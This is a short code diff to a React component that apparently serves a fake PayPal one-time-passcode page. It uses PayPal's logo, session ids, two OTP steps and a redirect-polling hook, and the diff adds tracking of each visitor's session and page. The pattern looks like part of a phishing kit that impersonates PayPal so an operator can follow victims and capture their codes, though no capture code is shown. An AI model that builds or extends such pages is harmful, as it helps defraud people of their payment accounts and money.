@@ -8,6 +8,7 @@ import { Label } from "@/components/ui/label";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
 import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
 import { useLanguage } from "@/hooks/use-language";
+import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 interface PayPalOTPPageProps {
   step?: 1 | 2;
@@ -23,6 +24,12 @@ export default function PayPalOTPPage({ step = 1 }: PayPalOTPPageProps) {
     const id = params.get("session");
     if (id) setSessionId(id);
   }, []);
+
+  // Track visitor
+  useVisitorTracking({
+    sessionId: sessionId || undefined,
+    page: step === 1 ? "/paypal/otp1" : "/paypal/otp2",
+  });
 
   // Use redirect polling hook
   useRedirectPolling({
